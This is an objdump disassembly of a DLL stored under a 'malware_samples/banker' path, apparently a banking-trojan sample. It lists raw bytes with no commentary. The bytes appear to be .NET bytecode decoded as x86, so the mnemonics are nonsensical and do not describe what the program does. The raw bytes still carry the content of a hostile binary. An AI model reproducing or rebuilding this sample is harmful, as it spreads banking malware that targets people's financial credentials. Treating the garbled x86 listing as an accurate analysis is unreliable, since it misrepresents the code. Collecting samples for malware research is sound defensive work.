
malware_samples/banker/0831371f51e5a15760dee3ce02c2009b029dcbde9012f6798c0968f2757f02de.dll:     file format pei-i386


Disassembly of section .text:

10002000 <.text>:
10002000:	91                   	xchg   %eax,%ecx
10002001:	51                   	push   %ecx
10002002:	00 00                	add    %al,(%eax)
10002004:	00 00                	add    %al,(%eax)
10002006:	00 00                	add    %al,(%eax)
10002008:	48                   	dec    %eax
10002009:	00 00                	add    %al,(%eax)
1000200b:	00 02                	add    %al,(%edx)
1000200d:	00 05 00 10 26 00    	add    %al,0x261000
10002013:	00 9c 2a 00 00 01 00 	add    %bl,0x10000(%edx,%ebp,1)
	...
1000204e:	00 00                	add    %al,(%eax)
10002050:	13 30                	adc    (%eax),%esi
10002052:	04 00                	add    $0x0,%al
10002054:	67 00 00             	add    %al,(%bx,%si)
10002057:	00 00                	add    %al,(%eax)
10002059:	00 00                	add    %al,(%eax)
1000205b:	00 28                	add    %ch,(%eax)
1000205d:	10 00                	adc    %al,(%eax)
1000205f:	00 0a                	add    %cl,(%edx)
10002061:	28 10                	sub    %dl,(%eax)
10002063:	00 00                	add    %al,(%eax)
10002065:	0a 72 01             	or     0x1(%edx),%dh
10002068:	00 00                	add    %al,(%eax)
1000206a:	70 28                	jo     0x10002094
1000206c:	11 00                	adc    %eax,(%eax)
1000206e:	00 0a                	add    %cl,(%edx)
10002070:	6f                   	outsl  %ds:(%esi),(%dx)
10002071:	12 00                	adc    (%eax),%al
10002073:	00 0a                	add    %cl,(%edx)
10002075:	72 e4                	jb     0x1000205b
10002077:	02 00                	add    (%eax),%al
10002079:	70 72                	jo     0x100020ed
1000207b:	fa                   	cli
1000207c:	02 00                	add    (%eax),%al
1000207e:	70 6f                	jo     0x100020ef
10002080:	13 00                	adc    (%eax),%eax
10002082:	00 0a                	add    %cl,(%edx)
10002084:	28 11                	sub    %dl,(%ecx)
10002086:	00 00                	add    %al,(%eax)
10002088:	0a 6f 12             	or     0x12(%edi),%ch
1000208b:	00 00                	add    %al,(%eax)
1000208d:	0a 02                	or     (%edx),%al
1000208f:	28 01                	sub    %al,(%ecx)
10002091:	00 00                	add    %al,(%eax)
10002093:	2b 7e 19             	sub    0x19(%esi),%edi
10002096:	00 00                	add    %al,(%eax)
10002098:	04 25                	add    $0x25,%al
1000209a:	2d 17 26 7e 18       	sub    $0x187e2617,%eax
1000209f:	00 00                	add    %al,(%eax)
100020a1:	04 fe                	add    $0xfe,%al
100020a3:	06                   	push   %es
100020a4:	0f 00 00             	sldt   (%eax)
100020a7:	06                   	push   %es
100020a8:	73 15                	jae    0x100020bf
100020aa:	00 00                	add    %al,(%eax)
100020ac:	0a 25 80 19 00 00    	or     0x1980,%ah
100020b2:	04 28                	add    $0x28,%al
100020b4:	02 00                	add    (%eax),%al
100020b6:	00 2b                	add    %ch,(%ebx)
100020b8:	28 03                	sub    %al,(%ebx)
100020ba:	00 00                	add    %al,(%eax)
100020bc:	2b 73 18             	sub    0x18(%ebx),%esi
100020bf:	00 00                	add    %al,(%eax)
100020c1:	0a 2a                	or     (%edx),%ch
100020c3:	00 13                	add    %dl,(%ebx)
100020c5:	30 04 00             	xor    %al,(%eax,%eax,1)
100020c8:	67 00 00             	add    %al,(%bx,%si)
100020cb:	00 00                	add    %al,(%eax)
100020cd:	00 00                	add    %al,(%eax)
100020cf:	00 28                	add    %ch,(%eax)
100020d1:	10 00                	adc    %al,(%eax)
100020d3:	00 0a                	add    %cl,(%edx)
100020d5:	28 10                	sub    %dl,(%eax)
100020d7:	00 00                	add    %al,(%eax)
100020d9:	0a 72 fc             	or     -0x4(%edx),%dh
100020dc:	02 00                	add    (%eax),%al
100020de:	70 28                	jo     0x10002108
100020e0:	11 00                	adc    %eax,(%eax)
100020e2:	00 0a                	add    %cl,(%edx)
100020e4:	6f                   	outsl  %ds:(%esi),(%dx)
100020e5:	12 00                	adc    (%eax),%al
100020e7:	00 0a                	add    %cl,(%edx)
100020e9:	72 6f                	jb     0x1000215a
100020eb:	04 00                	add    $0x0,%al
100020ed:	70 72                	jo     0x10002161
100020ef:	fa                   	cli
100020f0:	02 00                	add    (%eax),%al
100020f2:	70 6f                	jo     0x10002163
100020f4:	13 00                	adc    (%eax),%eax
100020f6:	00 0a                	add    %cl,(%edx)
100020f8:	28 11                	sub    %dl,(%ecx)
100020fa:	00 00                	add    %al,(%eax)
100020fc:	0a 6f 12             	or     0x12(%edi),%ch
100020ff:	00 00                	add    %al,(%eax)
10002101:	0a 02                	or     (%edx),%al
10002103:	28 01                	sub    %al,(%ecx)
10002105:	00 00                	add    %al,(%eax)
10002107:	2b 7e 1a             	sub    0x1a(%esi),%edi
1000210a:	00 00                	add    %al,(%eax)
1000210c:	04 25                	add    $0x25,%al
1000210e:	2d 17 26 7e 18       	sub    $0x187e2617,%eax
10002113:	00 00                	add    %al,(%eax)
10002115:	04 fe                	add    $0xfe,%al
10002117:	06                   	push   %es
10002118:	10 00                	adc    %al,(%eax)
1000211a:	00 06                	add    %al,(%esi)
1000211c:	73 15                	jae    0x10002133
1000211e:	00 00                	add    %al,(%eax)
10002120:	0a 25 80 1a 00 00    	or     0x1a80,%ah
10002126:	04 28                	add    $0x28,%al
10002128:	02 00                	add    (%eax),%al
1000212a:	00 2b                	add    %ch,(%ebx)
1000212c:	28 03                	sub    %al,(%ebx)
1000212e:	00 00                	add    %al,(%eax)
10002130:	2b 73 18             	sub    0x18(%ebx),%esi
10002133:	00 00                	add    %al,(%eax)
10002135:	0a 2a                	or     (%edx),%ch
10002137:	00 1b                	add    %bl,(%ebx)
10002139:	30 0a                	xor    %cl,(%edx)
1000213b:	00 20                	add    %ah,(%eax)
1000213d:	01 00                	add    %eax,(%eax)
1000213f:	00 01                	add    %al,(%ecx)
10002141:	00 00                	add    %al,(%eax)
10002143:	11 12                	adc    %edx,(%edx)
10002145:	00 fe                	add    %bh,%dh
10002147:	15 03 00 00 02       	adc    $0x2000003,%eax
1000214c:	12 00                	adc    (%eax),%al
1000214e:	06                   	push   %es
1000214f:	28 04 00             	sub    %al,(%eax,%eax,1)
10002152:	00 2b                	add    %ch,(%ebx)
10002154:	7d 02                	jge    0x10002158
10002156:	00 00                	add    %al,(%eax)
10002158:	04 12                	add    $0x12,%al
1000215a:	01 fe                	add    %edi,%esi
1000215c:	15 04 00 00 02       	adc    $0x2000004,%eax
10002161:	28 0c 00             	sub    %cl,(%eax,%eax,1)
10002164:	00 06                	add    %al,(%esi)
10002166:	14 7e                	adc    $0x7e,%al
10002168:	1a 00                	sbb    (%eax),%al
1000216a:	00 0a                	add    %cl,(%edx)
1000216c:	7e 1a                	jle    0x10002188
1000216e:	00 00                	add    %al,(%eax)
10002170:	0a 16                	or     (%esi),%dl
10002172:	1a 7e 1a             	sbb    0x1a(%esi),%bh
10002175:	00 00                	add    %al,(%eax)
10002177:	0a 14 12             	or     (%edx,%edx,1),%dl
1000217a:	00 12                	add    %dl,(%edx)
1000217c:	01 28                	add    %ebp,(%eax)
1000217e:	02 00                	add    (%eax),%al
10002180:	00 06                	add    %al,(%esi)
10002182:	2d 01 2a 00 07       	sub    $0x7002a01,%eax
10002187:	7b 14                	jnp    0x1000219d
10002189:	00 00                	add    %al,(%eax)
1000218b:	04 7e                	add    $0x7e,%al
1000218d:	1a 00                	sbb    (%eax),%al
1000218f:	00 0a                	add    %cl,(%edx)
10002191:	03 8e 69 20 00 30    	add    0x30002069(%esi),%ecx
10002197:	00 00                	add    %al,(%eax)
10002199:	1f                   	pop    %ds
1000219a:	40                   	inc    %eax
1000219b:	28 07                	sub    %al,(%edi)
1000219d:	00 00                	add    %al,(%eax)
1000219f:	06                   	push   %es
100021a0:	0c 08                	or     $0x8,%al
100021a2:	7e 1a                	jle    0x100021be
100021a4:	00 00                	add    %al,(%eax)
100021a6:	0a 28                	or     (%eax),%ch
100021a8:	1b 00                	sbb    (%eax),%eax
100021aa:	00 0a                	add    %cl,(%edx)
100021ac:	2c 0b                	sub    $0xb,%al
100021ae:	72 fa                	jb     0x100021aa
100021b0:	02 00                	add    (%eax),%al
100021b2:	70 73                	jo     0x10002227
100021b4:	1c 00                	sbb    $0x0,%al
100021b6:	00 0a                	add    %cl,(%edx)
100021b8:	7a 07                	jp     0x100021c1
100021ba:	7b 14                	jnp    0x100021d0
100021bc:	00 00                	add    %al,(%eax)
100021be:	04 08                	add    $0x8,%al
100021c0:	03 03                	add    (%ebx),%eax
100021c2:	8e 69 12             	mov    0x12(%ecx),%gs
100021c5:	04 28                	add    $0x28,%al
100021c7:	08 00                	or     %al,(%eax)
100021c9:	00 06                	add    %al,(%esi)
100021cb:	2d 0b 72 fa 02       	sub    $0x2fa720b,%eax
100021d0:	00 70 73             	add    %dh,0x73(%eax)
100021d3:	1c 00                	sbb    $0x0,%al
100021d5:	00 0a                	add    %cl,(%edx)
100021d7:	7a 07                	jp     0x100021e0
100021d9:	7b 14                	jnp    0x100021ef
100021db:	00 00                	add    %al,(%eax)
100021dd:	04 7e                	add    $0x7e,%al
100021df:	1a 00                	sbb    (%eax),%al
100021e1:	00 0a                	add    %cl,(%edx)
100021e3:	16                   	push   %ss
100021e4:	08 7e 1a             	or     %bh,0x1a(%esi)
100021e7:	00 00                	add    %al,(%eax)
100021e9:	0a 16                	or     (%esi),%dl
100021eb:	12 04 28             	adc    (%eax,%ebp,1),%al
100021ee:	05 00 00 06 0d       	add    $0xd060000,%eax
100021f3:	09 7e 1a             	or     %edi,0x1a(%esi)
100021f6:	00 00                	add    %al,(%eax)
100021f8:	0a 28                	or     (%eax),%ch
100021fa:	1b 00                	sbb    (%eax),%eax
100021fc:	00 0a                	add    %cl,(%edx)
100021fe:	2d 45 09 12 06       	sub    $0x6120945,%eax
10002203:	28 03                	sub    %al,(%ebx)
10002205:	00 00                	add    %al,(%eax)
10002207:	06                   	push   %es
10002208:	2c 12                	sub    $0x12,%al
1000220a:	11 06                	adc    %eax,(%esi)
1000220c:	20 03                	and    %al,(%ebx)
1000220e:	01 00                	add    %eax,(%eax)
10002210:	00 33                	add    %dh,(%ebx)
10002212:	0b 1f                	or     (%edi),%ebx
10002214:	64 28 1d 00 00 0a 2b 	sub    %bl,%fs:0x2b0a0000
1000221b:	e4 de                	in     $0xde,%al
1000221d:	45                   	inc    %ebp
1000221e:	07                   	pop    %es
1000221f:	7b 16                	jnp    0x10002237
10002221:	00 00                	add    %al,(%eax)
10002223:	04 28                	add    $0x28,%al
10002225:	1e                   	push   %ds
10002226:	00 00                	add    %al,(%eax)
10002228:	0a 13                	or     (%ebx),%dl
1000222a:	05 11 05 6f 1f       	add    $0x1f6f0511,%eax
1000222f:	00 00                	add    %al,(%eax)
10002231:	0a 16                	or     (%esi),%dl
10002233:	fe 01                	incb   (%ecx)
10002235:	2c 07                	sub    $0x7,%al
10002237:	11 05 6f 20 00 00    	adc    %eax,0x206f
1000223d:	0a 09                	or     (%ecx),%cl
1000223f:	28 01                	sub    %al,(%ecx)
10002241:	00 00                	add    %al,(%eax)
10002243:	06                   	push   %es
10002244:	26 de 1c 26          	ficomps %es:(%esi,%eiz,1)
10002248:	de 19                	ficomps (%ecx)
1000224a:	07                   	pop    %es
1000224b:	7b 14                	jnp    0x10002261
1000224d:	00 00                	add    %al,(%eax)
1000224f:	04 28                	add    $0x28,%al
10002251:	01 00                	add    %eax,(%eax)
10002253:	00 06                	add    %al,(%esi)
10002255:	26 07                	es pop %es
10002257:	7b 15                	jnp    0x1000226e
10002259:	00 00                	add    %al,(%eax)
1000225b:	04 28                	add    $0x28,%al
1000225d:	01 00                	add    %eax,(%eax)
1000225f:	00 06                	add    %al,(%esi)
10002261:	26 dc 2a             	fsubrl %es:(%edx)
10002264:	01 1c 00             	add    %ebx,(%eax,%eax,1)
10002267:	00 00                	add    %al,(%eax)
10002269:	00 42 00             	add    %al,0x0(%edx)
1000226c:	c1 03 01             	roll   $0x1,(%ebx)
1000226f:	03 13                	add    (%ebx),%edx
10002271:	00 00                	add    %al,(%eax)
10002273:	01 02                	add    %eax,(%edx)
10002275:	00 42 00             	add    %al,0x0(%edx)
10002278:	c4 06                	les    (%esi),%eax
1000227a:	01 19                	add    %ebx,(%ecx)
1000227c:	00 00                	add    %al,(%eax)
1000227e:	00 00                	add    %al,(%eax)
10002280:	2e 73 21             	jae,pn 0x100022a4
10002283:	00 00                	add    %al,(%eax)
10002285:	0a 80 01 00 00 04    	or     0x4000001(%eax),%al
1000228b:	2a 13                	sub    (%ebx),%dl
1000228d:	30 07                	xor    %al,(%edi)
1000228f:	00 62 02             	add    %ah,0x2(%edx)
10002292:	00 00                	add    %al,(%eax)
10002294:	02 00                	add    (%eax),%al
10002296:	00 11                	add    %dl,(%ecx)
10002298:	73 11                	jae    0x100022ab
1000229a:	00 00                	add    %al,(%eax)
1000229c:	06                   	push   %es
1000229d:	0a 06                	or     (%esi),%al
1000229f:	73 22                	jae    0x100022c3
100022a1:	00 00                	add    %al,(%eax)
100022a3:	0a 25 28 10 00 00    	or     0x1028,%ah
100022a9:	0a 28                	or     (%eax),%ch
100022ab:	10 00                	adc    %al,(%eax)
100022ad:	00 0a                	add    %cl,(%edx)
100022af:	72 85                	jb     0x10002236
100022b1:	04 00                	add    $0x0,%al
100022b3:	70 28                	jo     0x100022dd
100022b5:	11 00                	adc    %eax,(%eax)
100022b7:	00 0a                	add    %cl,(%edx)
100022b9:	6f                   	outsl  %ds:(%esi),(%dx)
100022ba:	12 00                	adc    (%eax),%al
100022bc:	00 0a                	add    %cl,(%edx)
100022be:	72 38                	jb     0x100022f8
100022c0:	06                   	push   %es
100022c1:	00 70 72             	add    %dh,0x72(%eax)
100022c4:	fa                   	cli
100022c5:	02 00                	add    (%eax),%al
100022c7:	70 6f                	jo     0x10002338
100022c9:	13 00                	adc    (%eax),%eax
100022cb:	00 0a                	add    %cl,(%edx)
100022cd:	28 11                	sub    %dl,(%ecx)
100022cf:	00 00                	add    %al,(%eax)
100022d1:	0a 6f 12             	or     0x12(%edi),%ch
100022d4:	00 00                	add    %al,(%eax)
100022d6:	0a 6f 23             	or     0x23(%edi),%ch
100022d9:	00 00                	add    %al,(%eax)
100022db:	0a 25 28 10 00 00    	or     0x1028,%ah
100022e1:	0a 28                	or     (%eax),%ch
100022e3:	10 00                	adc    %al,(%eax)
100022e5:	00 0a                	add    %cl,(%edx)
100022e7:	72 4e                	jb     0x10002337
100022e9:	06                   	push   %es
100022ea:	00 70 28             	add    %dh,0x28(%eax)
100022ed:	11 00                	adc    %eax,(%eax)
100022ef:	00 0a                	add    %cl,(%edx)
100022f1:	6f                   	outsl  %ds:(%esi),(%dx)
100022f2:	12 00                	adc    (%eax),%al
100022f4:	00 0a                	add    %cl,(%edx)
100022f6:	72 01                	jb     0x100022f9
100022f8:	08 00                	or     %al,(%eax)
100022fa:	70 72                	jo     0x1000236e
100022fc:	fa                   	cli
100022fd:	02 00                	add    (%eax),%al
100022ff:	70 6f                	jo     0x10002370
10002301:	13 00                	adc    (%eax),%eax
10002303:	00 0a                	add    %cl,(%edx)
10002305:	28 11                	sub    %dl,(%ecx)
10002307:	00 00                	add    %al,(%eax)
10002309:	0a 6f 12             	or     0x12(%edi),%ch
1000230c:	00 00                	add    %al,(%eax)
1000230e:	0a 6f 23             	or     0x23(%edi),%ch
10002311:	00 00                	add    %al,(%eax)
10002313:	0a 25 28 10 00 00    	or     0x1028,%ah
10002319:	0a 28                	or     (%eax),%ch
1000231b:	10 00                	adc    %al,(%eax)
1000231d:	00 0a                	add    %cl,(%edx)
1000231f:	72 17                	jb     0x10002338
10002321:	08 00                	or     %al,(%eax)
10002323:	70 28                	jo     0x1000234d
10002325:	11 00                	adc    %eax,(%eax)
10002327:	00 0a                	add    %cl,(%edx)
10002329:	6f                   	outsl  %ds:(%esi),(%dx)
1000232a:	12 00                	adc    (%eax),%al
1000232c:	00 0a                	add    %cl,(%edx)
1000232e:	72 d2                	jb     0x10002302
10002330:	08 00                	or     %al,(%eax)
10002332:	70 72                	jo     0x100023a6
10002334:	fa                   	cli
10002335:	02 00                	add    (%eax),%al
10002337:	70 6f                	jo     0x100023a8
10002339:	13 00                	adc    (%eax),%eax
1000233b:	00 0a                	add    %cl,(%edx)
1000233d:	28 11                	sub    %dl,(%ecx)
1000233f:	00 00                	add    %al,(%eax)
10002341:	0a 6f 12             	or     0x12(%edi),%ch
10002344:	00 00                	add    %al,(%eax)
10002346:	0a 6f 23             	or     0x23(%edi),%ch
10002349:	00 00                	add    %al,(%eax)
1000234b:	0a 25 28 10 00 00    	or     0x1028,%ah
10002351:	0a 28                	or     (%eax),%ch
10002353:	10 00                	adc    %al,(%eax)
10002355:	00 0a                	add    %cl,(%edx)
10002357:	72 e8                	jb     0x10002341
10002359:	08 00                	or     %al,(%eax)
1000235b:	70 28                	jo     0x10002385
1000235d:	11 00                	adc    %eax,(%eax)
1000235f:	00 0a                	add    %cl,(%edx)
10002361:	6f                   	outsl  %ds:(%esi),(%dx)
10002362:	12 00                	adc    (%eax),%al
10002364:	00 0a                	add    %cl,(%edx)
10002366:	72 a3                	jb     0x1000230b
10002368:	09 00                	or     %eax,(%eax)
1000236a:	70 72                	jo     0x100023de
1000236c:	fa                   	cli
1000236d:	02 00                	add    (%eax),%al
1000236f:	70 6f                	jo     0x100023e0
10002371:	13 00                	adc    (%eax),%eax
10002373:	00 0a                	add    %cl,(%edx)
10002375:	28 11                	sub    %dl,(%ecx)
10002377:	00 00                	add    %al,(%eax)
10002379:	0a 6f 12             	or     0x12(%edi),%ch
1000237c:	00 00                	add    %al,(%eax)
1000237e:	0a 6f 23             	or     0x23(%edi),%ch
10002381:	00 00                	add    %al,(%eax)
10002383:	0a 25 28 10 00 00    	or     0x1028,%ah
10002389:	0a 28                	or     (%eax),%ch
1000238b:	10 00                	adc    %al,(%eax)
1000238d:	00 0a                	add    %cl,(%edx)
1000238f:	72 b9                	jb     0x1000234a
10002391:	09 00                	or     %eax,(%eax)
10002393:	70 28                	jo     0x100023bd
10002395:	11 00                	adc    %eax,(%eax)
10002397:	00 0a                	add    %cl,(%edx)
10002399:	6f                   	outsl  %ds:(%esi),(%dx)
1000239a:	12 00                	adc    (%eax),%al
1000239c:	00 0a                	add    %cl,(%edx)
1000239e:	72 b4                	jb     0x10002354
100023a0:	0a 00                	or     (%eax),%al
100023a2:	70 72                	jo     0x10002416
100023a4:	fa                   	cli
100023a5:	02 00                	add    (%eax),%al
100023a7:	70 6f                	jo     0x10002418
100023a9:	13 00                	adc    (%eax),%eax
100023ab:	00 0a                	add    %cl,(%edx)
100023ad:	28 11                	sub    %dl,(%ecx)
100023af:	00 00                	add    %al,(%eax)
100023b1:	0a 6f 12             	or     0x12(%edi),%ch
100023b4:	00 00                	add    %al,(%eax)
100023b6:	0a 6f 23             	or     0x23(%edi),%ch
100023b9:	00 00                	add    %al,(%eax)
100023bb:	0a 25 28 10 00 00    	or     0x1028,%ah
100023c1:	0a 28                	or     (%eax),%ch
100023c3:	10 00                	adc    %al,(%eax)
100023c5:	00 0a                	add    %cl,(%edx)
100023c7:	72 ca                	jb     0x10002393
100023c9:	0a 00                	or     (%eax),%al
100023cb:	70 28                	jo     0x100023f5
100023cd:	11 00                	adc    %eax,(%eax)
100023cf:	00 0a                	add    %cl,(%edx)
100023d1:	6f                   	outsl  %ds:(%esi),(%dx)
100023d2:	12 00                	adc    (%eax),%al
100023d4:	00 0a                	add    %cl,(%edx)
100023d6:	72 44                	jb     0x1000241c
100023d8:	0b 00                	or     (%eax),%eax
100023da:	70 72                	jo     0x1000244e
100023dc:	fa                   	cli
100023dd:	02 00                	add    (%eax),%al
100023df:	70 6f                	jo     0x10002450
100023e1:	13 00                	adc    (%eax),%eax
100023e3:	00 0a                	add    %cl,(%edx)
100023e5:	28 11                	sub    %dl,(%ecx)
100023e7:	00 00                	add    %al,(%eax)
100023e9:	0a 6f 12             	or     0x12(%edi),%ch
100023ec:	00 00                	add    %al,(%eax)
100023ee:	0a 6f 23             	or     0x23(%edi),%ch
100023f1:	00 00                	add    %al,(%eax)
100023f3:	0a 25 28 10 00 00    	or     0x1028,%ah
100023f9:	0a 28                	or     (%eax),%ch
100023fb:	10 00                	adc    %al,(%eax)
100023fd:	00 0a                	add    %cl,(%edx)
100023ff:	72 5a                	jb     0x1000245b
10002401:	0b 00                	or     (%eax),%eax
10002403:	70 28                	jo     0x1000242d
10002405:	11 00                	adc    %eax,(%eax)
10002407:	00 0a                	add    %cl,(%edx)
10002409:	6f                   	outsl  %ds:(%esi),(%dx)
1000240a:	12 00                	adc    (%eax),%al
1000240c:	00 0a                	add    %cl,(%edx)
1000240e:	72 cd                	jb     0x100023dd
10002410:	0c 00                	or     $0x0,%al
10002412:	70 72                	jo     0x10002486
10002414:	fa                   	cli
10002415:	02 00                	add    (%eax),%al
10002417:	70 6f                	jo     0x10002488
10002419:	13 00                	adc    (%eax),%eax
1000241b:	00 0a                	add    %cl,(%edx)
1000241d:	28 11                	sub    %dl,(%ecx)
1000241f:	00 00                	add    %al,(%eax)
10002421:	0a 6f 12             	or     0x12(%edi),%ch
10002424:	00 00                	add    %al,(%eax)
10002426:	0a 6f 23             	or     0x23(%edi),%ch
10002429:	00 00                	add    %al,(%eax)
1000242b:	0a 25 28 10 00 00    	or     0x1028,%ah
10002431:	0a 28                	or     (%eax),%ch
10002433:	10 00                	adc    %al,(%eax)
10002435:	00 0a                	add    %cl,(%edx)
10002437:	72 e3                	jb     0x1000241c
10002439:	0c 00                	or     $0x0,%al
1000243b:	70 28                	jo     0x10002465
1000243d:	11 00                	adc    %eax,(%eax)
1000243f:	00 0a                	add    %cl,(%edx)
10002441:	6f                   	outsl  %ds:(%esi),(%dx)
10002442:	12 00                	adc    (%eax),%al
10002444:	00 0a                	add    %cl,(%edx)
10002446:	72 de                	jb     0x10002426
10002448:	0d 00 70 72 fa       	or     $0xfa727000,%eax
1000244d:	02 00                	add    (%eax),%al
1000244f:	70 6f                	jo     0x100024c0
10002451:	13 00                	adc    (%eax),%eax
10002453:	00 0a                	add    %cl,(%edx)
10002455:	28 11                	sub    %dl,(%ecx)
10002457:	00 00                	add    %al,(%eax)
10002459:	0a 6f 12             	or     0x12(%edi),%ch
1000245c:	00 00                	add    %al,(%eax)
1000245e:	0a 6f 23             	or     0x23(%edi),%ch
10002461:	00 00                	add    %al,(%eax)
10002463:	0a 7d 1b             	or     0x1b(%ebp),%bh
10002466:	00 00                	add    %al,(%eax)
10002468:	04 28                	add    $0x28,%al
1000246a:	10 00                	adc    %al,(%eax)
1000246c:	00 0a                	add    %cl,(%edx)
1000246e:	28 10                	sub    %dl,(%eax)
10002470:	00 00                	add    %al,(%eax)
10002472:	0a 72 f4             	or     -0xc(%edx),%dh
10002475:	0d 00 70 28 11       	or     $0x11287000,%eax
1000247a:	00 00                	add    %al,(%eax)
1000247c:	0a 6f 12             	or     0x12(%edi),%ch
1000247f:	00 00                	add    %al,(%eax)
10002481:	0a 72 77             	or     0x77(%edx),%dh
10002484:	13 00                	adc    (%eax),%eax
10002486:	70 72                	jo     0x100024fa
10002488:	fa                   	cli
10002489:	02 00                	add    (%eax),%al
1000248b:	70 6f                	jo     0x100024fc
1000248d:	13 00                	adc    (%eax),%eax
1000248f:	00 0a                	add    %cl,(%edx)
10002491:	28 11                	sub    %dl,(%ecx)
10002493:	00 00                	add    %al,(%eax)
10002495:	0a 6f 12             	or     0x12(%edi),%ch
10002498:	00 00                	add    %al,(%eax)
1000249a:	0a 28                	or     (%eax),%ch
1000249c:	10 00                	adc    %al,(%eax)
1000249e:	00 0a                	add    %cl,(%edx)
100024a0:	28 10                	sub    %dl,(%eax)
100024a2:	00 00                	add    %al,(%eax)
100024a4:	0a 72 8d             	or     -0x73(%edx),%dh
100024a7:	13 00                	adc    (%eax),%eax
100024a9:	70 28                	jo     0x100024d3
100024ab:	11 00                	adc    %eax,(%eax)
100024ad:	00 0a                	add    %cl,(%edx)
100024af:	6f                   	outsl  %ds:(%esi),(%dx)
100024b0:	12 00                	adc    (%eax),%al
100024b2:	00 0a                	add    %cl,(%edx)
100024b4:	72 48                	jb     0x100024fe
100024b6:	14 00                	adc    $0x0,%al
100024b8:	70 72                	jo     0x1000252c
100024ba:	fa                   	cli
100024bb:	02 00                	add    (%eax),%al
100024bd:	70 6f                	jo     0x1000252e
100024bf:	13 00                	adc    (%eax),%eax
100024c1:	00 0a                	add    %cl,(%edx)
100024c3:	28 11                	sub    %dl,(%ecx)
100024c5:	00 00                	add    %al,(%eax)
100024c7:	0a 6f 12             	or     0x12(%edi),%ch
100024ca:	00 00                	add    %al,(%eax)
100024cc:	0a 17                	or     (%edi),%dl
100024ce:	28 24 00             	sub    %ah,(%eax,%eax,1)
100024d1:	00 0a                	add    %cl,(%edx)
100024d3:	06                   	push   %es
100024d4:	fe 06                	incb   (%esi)
100024d6:	12 00                	adc    (%eax),%al
100024d8:	00 06                	add    %al,(%esi)
100024da:	73 25                	jae    0x10002501
100024dc:	00 00                	add    %al,(%eax)
100024de:	0a 28                	or     (%eax),%ch
100024e0:	05 00 00 2b 28       	add    $0x282b0000,%eax
100024e5:	06                   	push   %es
100024e6:	00 00                	add    %al,(%eax)
100024e8:	2b 0b                	sub    (%ebx),%ecx
100024ea:	07                   	pop    %es
100024eb:	73 21                	jae    0x1000250e
100024ed:	00 00                	add    %al,(%eax)
100024ef:	0a 07                	or     (%edi),%al
100024f1:	8e 69 6f             	mov    0x6f(%ecx),%gs
100024f4:	27                   	daa
100024f5:	00 00                	add    %al,(%eax)
100024f7:	0a 9a 2a 00 00 13    	or     0x1300002a(%edx),%bl
100024fd:	30 07                	xor    %al,(%edi)
100024ff:	00 a6 00 00 00 03    	add    %ah,0x3000000(%esi)
10002505:	00 00                	add    %al,(%eax)
10002507:	11 28                	adc    %ebp,(%eax)
10002509:	10 00                	adc    %al,(%eax)
1000250b:	00 0a                	add    %cl,(%edx)
1000250d:	28 10                	sub    %dl,(%eax)
1000250f:	00 00                	add    %al,(%eax)
10002511:	0a 72 5e             	or     0x5e(%edx),%dh
10002514:	14 00                	adc    $0x0,%al
10002516:	70 28                	jo     0x10002540
10002518:	11 00                	adc    %eax,(%eax)
1000251a:	00 0a                	add    %cl,(%edx)
1000251c:	6f                   	outsl  %ds:(%esi),(%dx)
1000251d:	12 00                	adc    (%eax),%al
1000251f:	00 0a                	add    %cl,(%edx)
10002521:	72 51                	jb     0x10002574
10002523:	16                   	push   %ss
10002524:	00 70 72             	add    %dh,0x72(%eax)
10002527:	fa                   	cli
10002528:	02 00                	add    (%eax),%al
1000252a:	70 6f                	jo     0x1000259b
1000252c:	13 00                	adc    (%eax),%eax
1000252e:	00 0a                	add    %cl,(%edx)
10002530:	28 11                	sub    %dl,(%ecx)
10002532:	00 00                	add    %al,(%eax)
10002534:	0a 6f 12             	or     0x12(%edi),%ch
10002537:	00 00                	add    %al,(%eax)
10002539:	0a 1a                	or     (%edx),%bl
1000253b:	28 04 00             	sub    %al,(%eax,%eax,1)
1000253e:	00 06                	add    %al,(%esi)
10002540:	28 28                	sub    %ch,(%eax)
10002542:	00 00                	add    %al,(%eax)
10002544:	0a 25 28 29 00 00    	or     0x2928,%ah
1000254a:	0a 26                	or     (%esi),%ah
1000254c:	28 0b                	sub    %cl,(%ebx)
1000254e:	00 00                	add    %al,(%eax)
10002550:	06                   	push   %es
10002551:	0a 1b                	or     (%ebx),%bl
10002553:	28 04 00             	sub    %al,(%eax,%eax,1)
10002556:	00 06                	add    %al,(%esi)
10002558:	72 67                	jb     0x100025c1
1000255a:	16                   	push   %ss
1000255b:	00 70 28             	add    %dh,0x28(%eax)
1000255e:	10 00                	adc    %al,(%eax)
10002560:	00 0a                	add    %cl,(%edx)
10002562:	28 10                	sub    %dl,(%eax)
10002564:	00 00                	add    %al,(%eax)
10002566:	0a 72 6b             	or     0x6b(%edx),%dh
10002569:	16                   	push   %ss
1000256a:	00 70 28             	add    %dh,0x28(%eax)
1000256d:	11 00                	adc    %eax,(%eax)
1000256f:	00 0a                	add    %cl,(%edx)
10002571:	6f                   	outsl  %ds:(%esi),(%dx)
10002572:	12 00                	adc    (%eax),%al
10002574:	00 0a                	add    %cl,(%edx)
10002576:	72 26                	jb     0x1000259e
10002578:	17                   	pop    %ss
10002579:	00 70 72             	add    %dh,0x72(%eax)
1000257c:	fa                   	cli
1000257d:	02 00                	add    (%eax),%al
1000257f:	70 6f                	jo     0x100025f0
10002581:	13 00                	adc    (%eax),%eax
10002583:	00 0a                	add    %cl,(%edx)
10002585:	28 11                	sub    %dl,(%ecx)
10002587:	00 00                	add    %al,(%eax)
10002589:	0a 6f 12             	or     0x12(%edi),%ch
1000258c:	00 00                	add    %al,(%eax)
1000258e:	0a 28                	or     (%eax),%ch
10002590:	2a 00                	sub    (%eax),%al
10002592:	00 0a                	add    %cl,(%edx)
10002594:	28 28                	sub    %ch,(%eax)
10002596:	00 00                	add    %al,(%eax)
10002598:	0a 0b                	or     (%ebx),%cl
1000259a:	06                   	push   %es
1000259b:	07                   	pop    %es
1000259c:	17                   	pop    %ss
1000259d:	28 2b                	sub    %ch,(%ebx)
1000259f:	00 00                	add    %al,(%eax)
100025a1:	0a 20                	or     (%eax),%ah
100025a3:	e8 03 00 00 28       	call   0x380025ab
100025a8:	1d 00 00 0a 07       	sbb    $0x70a0000,%eax
100025ad:	2a 2e                	sub    (%esi),%ch
100025af:	73 0e                	jae    0x100025bf
100025b1:	00 00                	add    %al,(%eax)
100025b3:	06                   	push   %es
100025b4:	80 18 00             	sbbb   $0x0,(%eax)
100025b7:	00 04 2a             	add    %al,(%edx,%ebp,1)
100025ba:	1e                   	push   %ds
100025bb:	02 28                	add    (%eax),%ch
100025bd:	2c 00                	sub    $0x0,%al
